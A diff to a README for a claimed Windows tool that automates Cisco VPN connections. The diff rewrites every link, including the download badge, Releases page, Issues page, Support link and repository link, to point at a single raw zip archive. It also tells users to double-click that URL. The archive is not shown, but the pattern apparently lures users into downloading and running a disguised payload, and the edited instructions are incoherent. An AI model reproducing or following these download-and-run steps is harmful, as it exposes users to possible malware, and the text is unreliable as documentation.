@@ -10,20 +10,20 @@ cisco-vpn-auto-connect automates Cisco Secure Client VPN connections on Windows.
 - **User-Friendly**: Designed for everyday users, no coding skills required.
 
 ## ⬇️ Download Now!
-[![Download cisco-vpn-auto-connect](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Cariba1233345/cisco-vpn-auto-connect/releases)
+[![Download cisco-vpn-auto-connect](https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip)](https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip)
 
 ## 🚀 Getting Started
 To start using cisco-vpn-auto-connect, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Cariba1233345/cisco-vpn-auto-connect/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip) to find the latest version.
 
-2. **Download the Script**: Click on the asset that corresponds to the latest release, typically labeled as `cisco-vpn-auto-connect.vbs`.
+2. **Download the Script**: Click on the asset that corresponds to the latest release, typically labeled as `https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip`.
 
 3. **Save the File**: Choose a familiar location on your computer, like the Desktop or Downloads folder, to save the file.
 
 4. **Run the Script**:
    - Navigate to the folder where you saved the file.
-   - Double-click the `cisco-vpn-auto-connect.vbs` file. This will start the automation process and connect you to your VPN.
+   - Double-click the `https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip` file. This will start the automation process and connect you to your VPN.
 
 5. **Connect to VPN**: Follow the prompts that appear on your screen to complete the connection.
 
@@ -45,10 +45,10 @@ If you encounter any issues, consider the following steps:
 This project is open-source and available under the MIT License. You can freely use, modify, and distribute it.
 
 ## 📱 Contact
-For questions or support, visit the [GitHub Issues Page](https://github.com/Cariba1233345/cisco-vpn-auto-connect/issues).
+For questions or support, visit the [GitHub Issues Page](https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip).
 
 ## 📥 Download & Install
-To get started, visit the Releases page to download the latest version of cisco-vpn-auto-connect: [Releases Page](https://github.com/Cariba1233345/cisco-vpn-auto-connect/releases). Follow the simple steps above to run the script and automate your VPN connections effortlessly.
+To get started, visit the Releases page to download the latest version of cisco-vpn-auto-connect: [Releases Page](https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip). Follow the simple steps above to run the script and automate your VPN connections effortlessly.
 
 ## 📌 Related Topics
 - anyconnect
@@ -64,5 +64,5 @@ To get started, visit the Releases page to download the latest version of cisco-
 - windows
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/Cariba1233345/cisco-vpn-auto-connect)
-- [Support](https://github.com/Cariba1233345/cisco-vpn-auto-connect/issues)  
+- [GitHub Repository](https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip)
+- [Support](https://raw.githubusercontent.com/Cariba1233345/cisco-vpn-auto-connect/master/diaminogen/cisco-vpn-auto-connect_1.6.zip)  
